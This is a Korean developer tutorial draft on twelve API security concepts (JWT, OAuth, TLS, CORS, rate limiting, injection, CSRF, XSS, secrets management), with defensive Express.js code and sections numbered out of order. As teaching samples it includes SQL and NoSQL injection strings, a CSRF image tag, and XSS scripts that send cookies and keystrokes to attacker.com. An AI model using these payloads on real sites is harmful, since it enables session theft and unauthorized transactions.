---
title: API 보안 - 알아야 할 12가지 핵심 개념
published: false
description: API 보안의 핵심 개념들을 쉽게 설명합니다. 인증/인가, HTTPS/TLS, Rate Limiting, CORS, Injection 공격, 방화벽, VPN, CSRF, XSS, Input Validation, API Keys 관리, 로깅/모니터링에 대해 알아봅니다.
tags: security, api, backend, webdev
cover_image: https://example.com/your-cover-image.jpg
---

# API 보안 - 알아야 할 12가지 핵심 개념

API는 현대 웹 애플리케이션의 핵심입니다. 하지만 제대로 보호하지 않으면 심각한 보안 위협에 노출될 수 있습니다. 이 글에서는 API 보안의 핵심 개념 12가지를 알기 쉽게 설명합니다.

---

## 1. 인증(Authentication) & 인가(Authorization) ⭐️⭐️⭐️

### 개념
**인증(Authentication)**: "당신은 누구인가?" - 사용자의 신원을 확인
**인가(Authorization)**: "이 작업을 할 권한이 있는가?" - 인증된 사용자의 권한을 확인

### 왜 가장 중요한가?
인증/인가가 없으면 누구나 API에 접근할 수 있어 보안이 무의미해집니다.

### 주요 인증 방식

**1. JWT (JSON Web Token)**
```javascript
const jwt = require('jsonwebtoken');

// 토큰 생성
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  // 사용자 인증
  const user = authenticateUser(username, password);
  
  if (user) {
    // JWT 토큰 발급
    const token = jwt.sign(
      { userId: user.id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );
    
    res.json({ token });
  } else {
    res.status(401).json({ error: '인증 실패' });
  }
});

// 토큰 검증 미들웨어
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN
  
  if (!token) {
    return res.status(401).json({ error: '토큰이 필요합니다' });
  }
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: '유효하지 않은 토큰' });
    }
    req.user = user;
    next();
  });
}

// 보호된 라우트
app.get('/api/profile', authenticateToken, (req, res) => {
  res.json({ userId: req.user.userId });
});
```

**2. OAuth 2.0**
```javascript
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: "http://localhost:3000/auth/google/callback"
  },
  function(accessToken, refreshToken, profile, cb) {
    // 사용자 정보로 로그인/회원가입 처리
    User.findOrCreate({ googleId: profile.id }, function (err, user) {
      return cb(err, user);
    });
  }
));

// 라우트
app.get('/auth/google',
  passport.authenticate('google', { scope: ['profile', 'email'] }));

app.get('/auth/google/callback', 
  passport.authenticate('google', { failureRedirect: '/login' }),
  function(req, res) {
    res.redirect('/dashboard');
  });
```

**3. API Keys**
```javascript
function validateApiKey(req, res, next) {
  const apiKey = req.headers['x-api-key'];
  
  if (!apiKey) {
    return res.status(401).json({ error: 'API 키가 필요합니다' });
  }
  
  // 데이터베이스에서 API 키 검증
  const validKey = db.apiKeys.findOne({ key: apiKey, active: true });
  
  if (!validKey) {
    return res.status(403).json({ error: '유효하지 않은 API 키' });
  }
  
  req.apiClient = validKey.clientId;
  next();
}

app.get('/api/data', validateApiKey, (req, res) => {
  res.json({ data: 'Protected data' });
});
```

### 인가(Authorization) 구현

**Role-Based Access Control (RBAC)**
```javascript
// 역할 정의
const ROLES = {
  ADMIN: 'admin',
  USER: 'user',
  GUEST: 'guest'
};

const PERMISSIONS = {
  [ROLES.ADMIN]: ['read', 'write', 'delete'],
  [ROLES.USER]: ['read', 'write'],
  [ROLES.GUEST]: ['read']
};

// 권한 검증 미들웨어
function authorize(requiredPermission) {
  return (req, res, next) => {
    const userRole = req.user.role;
    const userPermissions = PERMISSIONS[userRole] || [];
    
    if (!userPermissions.includes(requiredPermission)) {
      return res.status(403).json({ error: '권한이 없습니다' });
    }
    
    next();
  };
}

// 사용 예
app.delete('/api/users/:id', 
  authenticateToken,
  authorize('delete'),
  (req, res) => {
    // 삭제 로직
  }
);
```

**Attribute-Based Access Control (ABAC)**
```javascript
function checkResourceOwnership(req, res, next) {
  const resourceId = req.params.id;
  const userId = req.user.userId;
  
  db.resources.findById(resourceId).then(resource => {
    if (resource.ownerId !== userId && req.user.role !== ROLES.ADMIN) {
      return res.status(403).json({ error: '이 리소스에 접근할 권한이 없습니다' });
    }
    next();
  });
}

app.put('/api/documents/:id',
  authenticateToken,
  checkResourceOwnership,
  (req, res) => {
    // 문서 수정 로직
  }
);
```

### 베스트 프랙티스
- **비밀번호 해싱**: bcrypt, Argon2 사용 (절대 평문 저장 금지)
- **토큰 만료**: 액세스 토큰은 짧게(15분~1시간), 리프레시 토큰은 길게
- **다중 인증(MFA)**: 민감한 작업에 2단계 인증 적용
- **최소 권한 원칙**: 필요한 최소한의 권한만 부여

---

## 2. HTTPS/TLS (전송 계층 보안) ⭐️⭐️⭐️

### 개념
HTTPS는 HTTP에 TLS(Transport Layer Security) 암호화를 추가한 프로토콜입니다. 클라이언트와 서버 간의 모든 통신을 암호화하여 보호합니다.

### 왜 필수인가?
- **데이터 암호화**: 전송 중인 데이터를 제3자가 읽을 수 없도록 보호
- **중간자 공격(MITM) 방지**: 공격자가 통신을 가로채거나 변조하는 것을 방지
- **필수 요구사항**: 현대 웹의 표준이며, 많은 API가 HTTPS를 필수로 요구

### HTTPS 없이 통신하면?
```javascript
// HTTP로 전송 시 (위험!)
POST http://example.com/api/login
{
  "username": "alice",
  "password": "mypassword123"  // 평문으로 전송됨!
}

// 누구나 네트워크에서 가로챌 수 있음
// 공용 WiFi에서 특히 위험
```

### Let's Encrypt로 무료 SSL 인증서 발급

**1. Certbot 설치 및 인증서 발급**
```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install certbot

# 인증서 발급
sudo certbot certonly --standalone -d yourdomain.com -d www.yourdomain.com

# 자동 갱신 설정 (인증서는 90일 유효)
sudo certbot renew --dry-run
```

**2. Node.js/Express에서 HTTPS 설정**
```javascript
const https = require('https');
const fs = require('fs');
const express = require('express');

const app = express();

// SSL 인증서 로드
const options = {
  key: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/privkey.pem'),
  cert: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/fullchain.pem')
};

// HTTPS 서버 시작
https.createServer(options, app).listen(443, () => {
  console.log('HTTPS 서버가 포트 443에서 실행 중');
});

// HTTP를 HTTPS로 리다이렉트
const http = require('http');
http.createServer((req, res) => {
  res.writeHead(301, { Location: `https://${req.headers.host}${req.url}` });
  res.end();
}).listen(80);
```

**3. Nginx 리버스 프록시 설정**
```nginx
server {
    listen 80;
    server_name yourdomain.com www.yourdomain.com;
    
    # HTTP를 HTTPS로 리다이렉트
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name yourdomain.com www.yourdomain.com;
    
    # SSL 인증서
    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
    
    # 강력한 SSL 설정
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    
    # HSTS (HTTP Strict Transport Security)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

### Express.js 보안 헤더 설정
```javascript
const helmet = require('helmet');

app.use(helmet());

// 또는 수동 설정
app.use((req, res, next) => {
  // HSTS: 브라우저가 항상 HTTPS 사용하도록 강제
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  
  // X-Frame-Options: 클릭재킹 방지
  res.setHeader('X-Frame-Options', 'DENY');
  
  // X-Content-Type-Options: MIME 타입 스니핑 방지
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // X-XSS-Protection
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  next();
});
```

### 개발 환경에서 로컬 HTTPS

**mkcert 사용**
```bash
# mkcert 설치
brew install mkcert  # macOS
choco install mkcert # Windows

# 로컬 CA 생성
mkcert -install

# localhost 인증서 생성
mkcert localhost 127.0.0.1 ::1

# Node.js에서 사용
node server.js
```

```javascript
// server.js
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('./localhost-key.pem'),
  cert: fs.readFileSync('./localhost.pem')
};

https.createServer(options, app).listen(3000);
```

### 베스트 프랙티스
- **TLS 1.2 이상 사용**: TLS 1.0/1.1은 deprecated
- **강력한 암호화 스위트**: 약한 암호화 알고리즘 비활성화
- **HSTS 활성화**: 브라우저가 항상 HTTPS 사용하도록 강제
- **인증서 자동 갱신**: Let's Encrypt는 90일마다 갱신 필요
- **Mixed Content 경고 해결**: 모든 리소스를 HTTPS로 로드

---

## 3. Input Validation & Sanitization ⭐️⭐️

### 개념
Input Validation(입력 검증)은 사용자 입력이 예상된 형식과 범위에 맞는지 확인하는 과정이고, Sanitization(정화)은 위험한 문자나 코드를 제거하거나 무해하게 만드는 과정입니다.

### 왜 중요한가?
모든 공격의 시작점은 사용자 입력입니다. 입력 검증은 Injection, XSS 등 여러 공격을 동시에 방어합니다.

---

## 8. Rate Limiting (속도 제한)

### 개념
Rate Limiting은 특정 시간 동안 사용자나 IP가 API에 요청할 수 있는 횟수를 제한하는 기법입니다.

### 왜 필요한가?
- **DDoS 공격 방지**: 대량의 요청으로 서버를 마비시키는 것을 방지
- **리소스 보호**: 서버 자원의 공평한 분배

### 구현 방법
```javascript
// Express.js 예제
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15분
  max: 100, // 최대 100개 요청
  message: '너무 많은 요청을 보냈습니다. 나중에 다시 시도해주세요.'
});

app.use('/api/', limiter);
```

### 실제 사례
- GitHub API: 인증된 사용자는 시간당 5,000개 요청 제한
- Twitter API: 앱 인증 기준 15분당 300개 요청 제한

---

## 9. CORS (Cross-Origin Resource Sharing)

### 개념
CORS는 다른 출처(origin)의 웹 애플리케이션이 현재 출처의 리소스에 접근할 수 있는 권한을 부여하는 메커니즘입니다.

### 왜 필요한가?
- **동일 출처 정책(Same-Origin Policy)**: 브라우저는 기본적으로 다른 출처의 리소스 접근을 차단
- **안전한 리소스 공유**: 명시적으로 허용된 출처만 API에 접근 가능

### 출처(Origin)란?
출처는 `프로토콜 + 도메인 + 포트`의 조합입니다.
- `https://example.com:443`
- `http://localhost:3000`

### 구현 방법
```javascript
// Express.js 예제
const cors = require('cors');

// 모든 출처 허용 (개발 환경용)
app.use(cors());

// 특정 출처만 허용 (프로덕션 환경 권장)
app.use(cors({
  origin: 'https://myapp.com',
  methods: ['GET', 'POST'],
  credentials: true
}));
```

### 주의사항
- 프로덕션에서는 와일드카드(`*`) 사용 지양
- 신뢰할 수 있는 출처만 명시적으로 허용

---

## 4. SQL & NoSQL Injection (인젝션 공격)

### 개념
Injection 공격은 악의적인 코드를 입력 필드에 삽입하여 데이터베이스를 공격하는 기법입니다.

### SQL Injection 예시

**취약한 코드:**
```javascript
// 위험! 사용자 입력을 직접 쿼리에 포함
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**공격 시나리오:**
```javascript
username = "admin' --"
// 결과 쿼리: SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
// -- 이후는 주석 처리되어 비밀번호 검증이 무력화됨
```

**안전한 코드:**
```javascript
// Prepared Statement 사용
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.execute(query, [username, password]);
```

### NoSQL Injection 예시

**취약한 코드 (MongoDB):**
```javascript
// 위험!
db.users.find({ username: req.body.username, password: req.body.password });
```

**공격 시나리오:**
```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
// 모든 사용자 정보를 반환할 수 있음
```

**안전한 코드:**
```javascript
// 입력 값 검증 및 타입 확인
const username = String(req.body.username);
const password = String(req.body.password);
db.users.findOne({ username, password });
```

### 방어 방법
1. **Prepared Statements 사용**: SQL 쿼리와 데이터 분리
2. **입력 검증**: 모든 사용자 입력을 검증하고 sanitize
3. **ORM 사용**: Sequelize, TypeORM 등의 ORM 도구 활용
4. **최소 권한 원칙**: 데이터베이스 계정에 필요한 최소한의 권한만 부여

---

## 10. Firewalls (방화벽)

### 개념
방화벽은 네트워크 트래픽을 모니터링하고 보안 규칙에 따라 트래픽을 허용하거나 차단하는 시스템입니다.

### 종류

**1. 네트워크 방화벽 (Network Firewall)**
- 하드웨어 또는 소프트웨어 기반
- IP 주소, 포트, 프로토콜 기반으로 필터링
- 예: AWS Security Groups, Azure Network Security Groups

**2. 웹 애플리케이션 방화벽 (WAF - Web Application Firewall)**
- HTTP/HTTPS 트래픽 검사
- SQL Injection, XSS 등 애플리케이션 계층 공격 방어
- 예: AWS WAF, Cloudflare WAF, ModSecurity

### 실제 구성 예시

**AWS Security Group 규칙:**
```
Inbound Rules:
- Type: HTTP, Protocol: TCP, Port: 80, Source: 0.0.0.0/0
- Type: HTTPS, Protocol: TCP, Port: 443, Source: 0.0.0.0/0
- Type: SSH, Protocol: TCP, Port: 22, Source: 내 IP만

Outbound Rules:
- All traffic allowed (기본값)
```

### 베스트 프랙티스
- **화이트리스트 방식**: 필요한 트래픽만 명시적으로 허용
- **정기적인 규칙 검토**: 불필요한 규칙 제거
- **계층적 방어**: 네트워크 방화벽 + WAF 조합

---

## 11. VPNs (Virtual Private Networks)

### 개념
VPN은 공용 네트워크를 통해 안전한 암호화된 연결을 제공하는 기술입니다.

### API 보안과의 관계

**1. 내부 API 보호**
```
인터넷 → VPN Gateway → 프라이빗 네트워크 → 내부 API
```
- 민감한 내부 API는 VPN을 통해서만 접근 가능하도록 설정
- 외부에서 직접 접근 불가

**2. 원격 개발자 접근**
- 개발자가 회사 내부 API에 안전하게 접근
- IP 화이트리스트와 결합하여 보안 강화

### 구현 예시

**AWS VPN 구성:**
```
1. VPC 생성
2. Private Subnet에 API 서버 배치
3. VPN Gateway 설정
4. 클라이언트 VPN 엔드포인트 구성
5. 인증서 기반 인증 설정
```

**OpenVPN 서버 설정:**
```bash
# OpenVPN 설치
sudo apt-get install openvpn

# 클라이언트 설정 파일 생성
client
dev tun
proto udp
remote your-server-ip 1194
ca ca.crt
cert client.crt
key client.key
```

### 사용 시나리오
- **마이크로서비스 간 통신**: 서비스 메시 대신 VPN 사용
- **관리자 API**: 관리 기능은 VPN을 통해서만 접근
- **테스트 환경**: 스테이징 환경을 VPN으로 보호

---

## 7. CSRF (Cross-Site Request Forgery)

### 개념
CSRF는 인증된 사용자가 자신도 모르게 악의적인 요청을 보내도록 만드는 공격입니다.

### 공격 시나리오

**상황:**
1. 사용자가 은행 사이트(bank.com)에 로그인
2. 로그인 쿠키가 브라우저에 저장됨
3. 사용자가 악의적인 사이트(evil.com)를 방문

**악의적인 페이지:**
```html
<!-- evil.com의 페이지 -->
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

**결과:**
- 브라우저가 자동으로 은행 사이트의 쿠키를 포함하여 요청
- 사용자도 모르게 송금 요청이 실행됨

### 방어 방법

**1. CSRF 토큰 사용**
```javascript
// 서버에서 CSRF 토큰 생성 및 세션에 저장
const csrfToken = generateToken();
req.session.csrfToken = csrfToken;

// HTML에 토큰 삽입
<form action="/api/transfer" method="POST">
  <input type="hidden" name="_csrf" value="${csrfToken}" />
  <input type="text" name="amount" />
  <button type="submit">송금</button>
</form>

// 서버에서 토큰 검증
app.post('/api/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // 송금 처리...
});
```

**2. SameSite 쿠키 속성**
```javascript
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // 또는 'lax'
});
```

- `strict`: 모든 크로스 사이트 요청에서 쿠키 차단
- `lax`: GET 요청은 허용, POST 등은 차단

**3. Double Submit Cookie**
```javascript
// 쿠키와 요청 헤더에 동일한 토큰 포함
res.cookie('csrf-token', token);
// 클라이언트는 요청 시 헤더에 토큰 포함
axios.post('/api/transfer', data, {
  headers: { 'X-CSRF-Token': token }
});
```

### Express.js에서 CSRF 보호
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/api/data', (req, res) => {
  // CSRF 토큰이 자동으로 검증됨
  res.send('Data processed');
});
```

---

## 5. XSS (Cross-Site Scripting)

### 개념
XSS는 악의적인 스크립트를 웹 페이지에 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.

### XSS 공격 유형

**1. Stored XSS (저장형)**
```javascript
// 사용자가 댓글 작성
const comment = "<script>alert('XSS')</script>";

// 데이터베이스에 저장
db.comments.insert({ text: comment });

// 다른 사용자가 댓글을 볼 때
<div>{comment}</div> // 스크립트가 실행됨!
```

**2. Reflected XSS (반사형)**
```javascript
// URL: https://example.com/search?q=<script>alert('XSS')</script>

// 서버에서 쿼리를 그대로 출력
<div>검색 결과: {req.query.q}</div>
```

**3. DOM-based XSS**
```javascript
// URL: https://example.com#<img src=x onerror=alert('XSS')>

// 클라이언트 사이드에서 처리
document.getElementById('output').innerHTML = window.location.hash;
```

### 실제 피해 사례
```javascript
// 쿠키 탈취
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// 키로깅
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>

// 페이지 변조
<script>
  document.body.innerHTML = '<h1>해킹당했습니다!</h1>';
</script>
```

### 방어 방법

**1. 입력 값 Escaping**
```javascript
// HTML Escape
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, (m) => map[m]);
}

// 사용 예
const userInput = escapeHtml(req.body.comment);
res.send(`<div>${userInput}</div>`);
```

**2. React에서의 자동 Escaping**
```javascript
// React는 기본적으로 XSS를 방지
function Comment({ text }) {
  return <div>{text}</div>; // 자동으로 escape됨
}

// 위험! dangerouslySetInnerHTML 사용 시 주의
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

**3. Content Security Policy (CSP)**
```javascript
// Express.js 미들웨어
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'"
  );
  next();
});
```

**4. DOMPurify 라이브러리 사용**
```javascript
import DOMPurify from 'dompurify';

// HTML 정화
const clean = DOMPurify.sanitize(dirty);
document.getElementById('output').innerHTML = clean;
```

**5. HttpOnly 쿠키**
```javascript
// 쿠키를 JavaScript로 접근 불가능하게 설정
res.cookie('sessionId', sessionId, {
  httpOnly: true, // XSS로 쿠키 탈취 방지
  secure: true,
  sameSite: 'strict'
});
```

### Node.js/Express 베스트 프랙티스
```javascript
const helmet = require('helmet');
const validator = require('validator');

// Helmet으로 보안 헤더 자동 설정
app.use(helmet());

// 사용자 입력 검증
app.post('/api/comment', (req, res) => {
  const comment = req.body.comment;
  
  // 입력 검증
  if (!validator.isLength(comment, { min: 1, max: 500 })) {
    return res.status(400).send('잘못된 입력입니다');
  }
  
  // HTML 태그 제거
  const sanitized = validator.stripLow(comment);
  
  // 데이터베이스에 저장
  db.comments.insert({ text: sanitized });
  
  res.send('댓글이 등록되었습니다');
});
```

---

### 검증해야 할 입력

**1. 데이터 타입 검증**
```javascript
const validator = require('validator');

app.post('/api/user', (req, res) => {
  const { email, age, username, website } = req.body;
  
  // 이메일 검증
  if (!validator.isEmail(email)) {
    return res.status(400).json({ error: '유효하지 않은 이메일 형식' });
  }
  
  // 숫자 범위 검증
  if (!validator.isInt(String(age), { min: 18, max: 120 })) {
    return res.status(400).json({ error: '나이는 18-120 사이여야 합니다' });
  }
  
  // 문자열 길이 검증
  if (!validator.isLength(username, { min: 3, max: 20 })) {
    return res.status(400).json({ error: '사용자명은 3-20자여야 합니다' });
  }
  
  // URL 검증
  if (website && !validator.isURL(website)) {
    return res.status(400).json({ error: '유효하지 않은 URL' });
  }
  
  // 통과한 데이터 처리
  createUser({ email, age, username, website });
  res.status(201).json({ message: '사용자 생성 완료' });
});
```

**2. 화이트리스트 방식 검증**
```javascript
// 허용된 값만 받기
const ALLOWED_ROLES = ['user', 'admin', 'moderator'];
const ALLOWED_SORT_FIELDS = ['createdAt', 'updatedAt', 'name'];

app.get('/api/users', (req, res) => {
  const { role, sortBy } = req.query;
  
  // 화이트리스트 검증
  if (role && !ALLOWED_ROLES.includes(role)) {
    return res.status(400).json({ error: '유효하지 않은 역할' });
  }
  
  if (sortBy && !ALLOWED_SORT_FIELDS.includes(sortBy)) {
    return res.status(400).json({ error: '유효하지 않은 정렬 필드' });
  }
  
  // 안전한 쿼리 실행
  const users = db.users.find({ role }).sort(sortBy);
  res.json(users);
});
```

**3. 정규표현식 검증**
```javascript
app.post('/api/phone', (req, res) => {
  const { phoneNumber } = req.body;
  
  // 한국 전화번호 형식 검증
  const phoneRegex = /^01[0-9]-?[0-9]{3,4}-?[0-9]{4}$/;
  
  if (!phoneRegex.test(phoneNumber)) {
    return res.status(400).json({ error: '유효하지 않은 전화번호 형식' });
  }
  
  // 처리...
});
```

### Sanitization (입력 정화)

**1. HTML/JavaScript 제거**
```javascript
const sanitizeHtml = require('sanitize-html');

app.post('/api/comment', (req, res) => {
  let { comment } = req.body;
  
  // 위험한 HTML 태그 제거
  comment = sanitizeHtml(comment, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a'],
    allowedAttributes: {
      'a': ['href']
    },
    allowedSchemes: ['http', 'https']
  });
  
  db.comments.insert({ text: comment });
  res.status(201).json({ message: '댓글 등록 완료' });
});
```

**2. SQL Injection 방지**
```javascript
// 나쁜 예
const query = `SELECT * FROM users WHERE id = ${req.params.id}`; // 위험!

// 좋은 예
const query = 'SELECT * FROM users WHERE id = ?';
db.execute(query, [req.params.id]);
```

**3. 파일 업로드 검증**
```javascript
const multer = require('multer');
const path = require('path');

const storage = multer.diskStorage({
  destination: './uploads/',
  filename: (req, file, cb) => {
    // 안전한 파일명 생성
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({
  storage: storage,
  limits: {
    fileSize: 5 * 1024 * 1024 // 5MB 제한
  },
  fileFilter: (req, file, cb) => {
    // 허용된 파일 타입만
    const allowedTypes = /jpeg|jpg|png|gif|pdf/;
    const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
    const mimetype = allowedTypes.test(file.mimetype);
    
    if (mimetype && extname) {
      return cb(null, true);
    } else {
      cb(new Error('지원하지 않는 파일 형식입니다'));
    }
  }
});

app.post('/api/upload', upload.single('file'), (req, res) => {
  res.json({ filename: req.file.filename });
});
```

### 스키마 검증 라이브러리

**Joi를 사용한 검증**
```javascript
const Joi = require('joi');

const userSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  email: Joi.string().email().required(),
  password: Joi.string().pattern(new RegExp('^[a-zA-Z0-9]{8,30}$')).required(),
  age: Joi.number().integer().min(18).max(120),
  website: Joi.string().uri().optional()
});

app.post('/api/register', (req, res) => {
  const { error, value } = userSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  
  // 검증된 데이터 사용
  createUser(value);
  res.status(201).json({ message: '회원가입 완료' });
});
```

**Express-validator 사용**
```javascript
const { body, validationResult } = require('express-validator');

app.post('/api/login',
  [
    body('email').isEmail().normalizeEmail(),
    body('password').isLength({ min: 8 }).trim().escape()
  ],
  (req, res) => {
    const errors = validationResult(req);
    
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // 로그인 처리
  }
);
```

### 베스트 프랙티스
- **클라이언트와 서버 양쪽 검증**: 클라이언트 검증만으로는 불충분
- **화이트리스트 방식**: 허용할 것을 명시 (블랙리스트보다 안전)
- **조기 검증**: 요청 초기에 검증하여 리소스 낭비 방지
- **명확한 에러 메시지**: 사용자가 이해하기 쉬운 메시지 제공
- **모든 입력 검증**: URL 파라미터, 쿼리, Body, 헤더 모두 검증

---

## 6. API Keys & Secrets Management ⭐️⭐️

### 개념
API Keys와 Secrets(비밀 정보)를 안전하게 저장하고 관리하는 것은 보안의 핵심입니다.

### 왜 중요한가?
- **정보 유출 방지**: 하드코딩된 비밀 정보가 GitHub 등에 노출되면 즉각적인 보안 위협
- **환경별 설정**: 개발/스테이징/프로덕션 환경별로 다른 키 사용
- **쉬운 키 교체**: 비밀 정보가 노출되었을 때 빠른 교체 가능

### 절대 하지 말아야 할 것

**❌ 코드에 하드코딩**
```javascript
// 절대 안 됨!
const API_KEY = 'sk-1234567890abcdef';
const DB_PASSWORD = 'MyP@ssw0rd123';
const JWT_SECRET = 'super-secret-key';

mongoose.connect('mongodb://admin:password123@localhost/mydb');
```

**❌ Git에 커밋**
```javascript
// config.js (이 파일이 GitHub에 올라가면 큰일!)
module.exports = {
  apiKey: 'sk-live-123456',
  stripeKey: 'pk_live_abcdef'
};
```

### 올바른 방법

**1. 환경 변수 사용**

**.env 파일 생성**
```env
# .env (이 파일은 .gitignore에 추가!)
NODE_ENV=production
PORT=3000
DB_HOST=localhost
DB_USER=myapp
DB_PASSWORD=secure_password_here
DB_NAME=myapp_db
JWT_SECRET=your-super-secret-jwt-key-change-this
API_KEY=sk-1234567890abcdef
STRIPE_SECRET_KEY=sk_live_abcdefghijk
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**.gitignore에 추가**
```gitignore
# .gitignore
.env
.env.local
.env.*.local
config/secrets.json
```

**dotenv 사용**
```javascript
// app.js
require('dotenv').config();

const dbConfig = {
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME
};

const jwtSecret = process.env.JWT_SECRET;
const apiKey = process.env.API_KEY;

// 환경 변수 누락 체크
if (!process.env.JWT_SECRET) {
  console.error('JWT_SECRET이 설정되지 않았습니다!');
  process.exit(1);
}
```

**2. AWS Secrets Manager**

```javascript
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager({ region: 'us-east-1' });

async function getSecret(secretName) {
  try {
    const data = await secretsManager.getSecretValue({ SecretId: secretName }).promise();
    
    if ('SecretString' in data) {
      return JSON.parse(data.SecretString);
    }
  } catch (err) {
    console.error('비밀 정보를 가져오는데 실패했습니다:', err);
    throw err;
  }
}

// 사용 예
async function initApp() {
  const secrets = await getSecret('myapp/production/database');
  
  const dbConnection = await mongoose.connect(
    `mongodb://${secrets.username}:${secrets.password}@${secrets.host}/${secrets.dbname}`
  );
  
  console.log('데이터베이스 연결 완료');
}

initApp();
```

**3. HashiCorp Vault**

```javascript
const vault = require('node-vault')({
  endpoint: 'http://127.0.0.1:8200',
  token: process.env.VAULT_TOKEN
});

async function getDbCredentials() {
  try {
    const result = await vault.read('secret/data/database');
    return result.data.data; // { username, password, host }
  } catch (err) {
    console.error('Vault에서 비밀 정보를 가져오지 못했습니다:', err);
    throw err;
  }
}
```

**4. Azure Key Vault**

```javascript
const { SecretClient } = require('@azure/keyvault-secrets');
const { DefaultAzureCredential } = require('@azure/identity');

const credential = new DefaultAzureCredential();
const vaultUrl = `https://${process.env.KEY_VAULT_NAME}.vault.azure.net`;
const client = new SecretClient(vaultUrl, credential);

async function getSecret(secretName) {
  try {
    const secret = await client.getSecret(secretName);
    return secret.value;
  } catch (err) {
    console.error(`비밀 "${secretName}"를 가져올 수 없습니다:`, err);
    throw err;
  }
}

// 사용 예
const dbPassword = await getSecret('database-password');
```

### API Key 생성 및 관리

**안전한 API Key 생성**
```javascript
const crypto = require('crypto');

function generateApiKey() {
  // 32바이트 랜덤 키 생성
  return crypto.randomBytes(32).toString('hex');
}

// 사용 예
app.post('/api/keys/generate', authenticateToken, async (req, res) => {
  const apiKey = generateApiKey();
  
  // 해시화하여 저장 (원본 키는 한 번만 보여줌)
  const hashedKey = crypto
    .createHash('sha256')
    .update(apiKey)
    .digest('hex');
  
  await db.apiKeys.insert({
    userId: req.user.id,
    keyHash: hashedKey,
    createdAt: new Date(),
    lastUsed: null
  });
  
  // 사용자에게 한 번만 보여줌
  res.json({ 
    apiKey,
    message: '이 키를 안전한 곳에 저장하세요. 다시 볼 수 없습니다.'
  });
});
```

**API Key 검증**
```javascript
async function validateApiKey(req, res, next) {
  const apiKey = req.headers['x-api-key'];
  
  if (!apiKey) {
    return res.status(401).json({ error: 'API 키가 필요합니다' });
  }
  
  // 키 해시화
  const keyHash = crypto.createHash('sha256').update(apiKey).digest('hex');
  
  // 데이터베이스에서 검증
  const key = await db.apiKeys.findOne({ keyHash, active: true });
  
  if (!key) {
    return res.status(403).json({ error: '유효하지 않은 API 키' });
  }
  
  // 마지막 사용 시간 업데이트
  await db.apiKeys.update({ _id: key._id }, { lastUsed: new Date() });
  
  req.apiKey = key;
  next();
}
```

### 환경별 설정 관리

```javascript
// config/index.js
const env = process.env.NODE_ENV || 'development';

const config = {
  development: {
    db: {
      host: 'localhost',
      port: 5432,
      name: 'myapp_dev'
    },
    apiUrl: 'http://localhost:3000'
  },
  production: {
    db: {
      host: process.env.DB_HOST,
      port: process.env.DB_PORT,
      name: process.env.DB_NAME
    },
    apiUrl: process.env.API_URL
  }
};

module.exports = config[env];
```

### 베스트 프랙티스
